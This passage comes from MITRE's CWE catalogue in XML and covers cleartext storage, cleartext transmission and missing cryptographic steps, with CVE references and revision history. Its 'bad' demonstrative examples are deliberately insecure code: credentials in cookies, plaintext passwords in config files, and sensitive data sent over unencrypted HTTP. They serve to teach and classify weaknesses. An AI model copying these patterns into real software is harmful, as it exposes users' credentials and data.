         <Extended_Description>Because the information is stored in cleartext, attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="922" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="922" View_ID="699"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker with access to the system could read sensitive information stored in cleartext.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-44">
               <Intro_Text>The following code excerpt stores a plaintext user account ID in a browser cookie.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>response.addCookie( new Cookie("userAccountID", acctID);</xhtml:div>
               </Example_Code>
               <Body_Text>Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-40">
               <Intro_Text>This code writes a user's login information to a cookie so the user does not have to login again later.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>function persistLogin($username, $password){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>$data = array("username" =&gt; $username, "password"=&gt; $password);<xhtml:br/>setcookie ("userdata", $data);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.</Body_Text>
               <Body_Text>Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-41">
               <Intro_Text>The following code attempts to establish a connection, read in a password, then store it to a buffer.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>server.sin_family = AF_INET; hp = gethostbyname(argv[1]);<xhtml:br/>if (hp==NULL) error("Unknown host");<xhtml:br/>memcpy( (char *)&amp;server.sin_addr,(char *)hp-&gt;h_addr,hp-&gt;h_length);<xhtml:br/>if (argc &lt; 3) port = 80;<xhtml:br/>else port = (unsigned short)atoi(argv[3]);<xhtml:br/>server.sin_port = htons(port);<xhtml:br/>if (connect(sock, (struct sockaddr *)&amp;server, sizeof server) &lt; 0) error("Connecting");<xhtml:br/>...<xhtml:br/>while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>write(dfd,password_buffer,n);<xhtml:br/>...<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a plaintext username / password pair.</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>
                     <xhtml:div>
                        <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     </xhtml:div>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:br/>&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;<xhtml:br/>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-2272</Reference>
               <Description>password and username stored in cleartext in a cookie</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1466</Reference>
               <Description>password stored in cleartext in a file with insecure permissions</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1466</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0152</Reference>
               <Description>chat program disables SSL in some circumstances even when the user says to use SSL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0152</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1603</Reference>
               <Description>Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0964</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6157</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6828</Reference>
               <Description>product stores a password in cleartext in memory</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1567</Reference>
               <Description>storage of a secret key in cleartext in a temporary file</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1567</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0174</Reference>
               <Description>SCADA product uses HTTP Basic Authentication, which is not encrypted</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5778</Reference>
               <Description>login credentials stored unencrypted in a registry key</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5778</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1481</Reference>
               <Description>Plaintext credentials in world-readable file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1481</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1828</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2209</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2209</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1696</Reference>
               <Description>Decrypted copy of a message written to disk given a combination of options and when user replies to an encrypted message.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1696</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2397</Reference>
               <Description>Plaintext storage of private key and passphrase in log file when user imports the key.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2397</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1800</Reference>
               <Description>Admin password in plaintext in a cookie.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1800</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1537</Reference>
               <Description>Default configuration has cleartext usernames/passwords in cookie.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1537</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1536</Reference>
               <Description>Usernames/passwords in cleartext in cookies.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1536</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2160</Reference>
               <Description>Authentication information stored in cleartext in a cookie.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2160</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Storage of Sensitive Information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="37"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Encryption&#34;, Page&#xA;                  43."/>
            <Reference External_Reference_ID="REF-172"/>
         </References>
         <Notes>
            <Note Type="Terminology">Different people use "cleartext" and "plaintext" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2009-01-12">Plaintext Storage of Sensitive Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="319" Name="Cleartext Transmission of Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.</Description>
         <Extended_Description>Many communication channels can be "sniffed" by attackers during data transmission. For example, network traffic can often be sniffed by any attacker who has access to a network interface. This significantly lowers the difficulty of exploitation by attackers.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>Anyone can read the information by gaining access to the channel being used for communication.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-11">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Encrypt the data with a reliable encryption scheme before transmitting.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-42">
               <Intro_Text>The following code attempts to establish a connection to a site to communicate sensitive information.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>URL u = new URL("http://www.secret.example.org/");<xhtml:br/>HttpURLConnection hu = (HttpURLConnection) u.openConnection();<xhtml:br/>hu.setRequestMethod("PUT");<xhtml:br/>hu.connect();<xhtml:br/>OutputStream os = hu.getOutputStream();<xhtml:br/>hu.disconnect();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>catch (IOException e) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:div>
                              <xhtml:i>//...</xhtml:i>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1949</Reference>
               <Description>Passwords transmitted in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1949</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4122</Reference>
               <Description>Chain: Use of HTTPS cookie without "secure" flag causes it to be transmitted across unencrypted HTTP.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4122</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3289</Reference>
               <Description>Product sends password hash in cleartext in violation of intended policy.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3289</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4390</Reference>
               <Description>Remote management feature sends sensitive information including passwords in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4390</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5626</Reference>
               <Description>Backup routine sends password in cleartext in email.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5626</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1852</Reference>
               <Description>Product transmits Blowfish encryption key in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1852</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0374</Reference>
               <Description>Printer sends configuration information, including administrative password, in cleartext.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4961</Reference>
               <Description>Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4786</Reference>
               <Description>Product sends passwords in cleartext to a log server.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4786</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3140</Reference>
               <Description>Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3140</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Transmission of Sensitive Information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Java Secure Coding">
               <Entry_ID>SEC06-J</Entry_ID>
               <Entry_Name>Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Java Secure Coding">
               <Entry_ID>SER02-J</Entry_ID>
               <Entry_Name>Sign then seal sensitive objects before sending them outside a trust boundary</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
            <Related_Attack_Pattern CAPEC_ID="383"/>
            <Related_Attack_Pattern CAPEC_ID="477"/>
            <Related_Attack_Pattern CAPEC_ID="65"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-271"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 9, &#34;Protecting Secret Data&#34; Page 299"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 22: Failing to Protect Network Traffic.&#34; Page&#xA;                  337"/>
            <Reference External_Reference_ID="REF-172"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2009-01-12">Plaintext Transmission of Sensitive Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="325" Name="Missing Required Cryptographic Step" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by that algorithm.</Description>
         <Extended_Description>Cryptographic implementations should follow the algorithms that define them exactly, otherwise encryption can be weaker than expected.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="358" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>Developers sometimes omit certain "expensive" (resource-intensive) steps in order to improve performance, especially in devices with limited memory or CPU cycles. This could be done under a mistaken impression that the step is unnecessary for preserving security. Alternately, the developer might adopt a threat model that is inconsistent with that of its consumers by accepting a risk for which the remaining protection seems "good enough."</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Requirements</Phase>
               <Note>
                  <xhtml:p>This issue can be introduced when the requirements for the algorithm are not clearly stated.</xhtml:p>
               </Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If the cryptographic algorithm is used for authentication and authorization, then an attacker could gain unauthorized access to the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>Sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven.</Note>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1585</Reference>
               <Description>Missing challenge-response step allows authentication bypass using public key.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1585</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Cryptography</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Missing Required Cryptographic Step</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
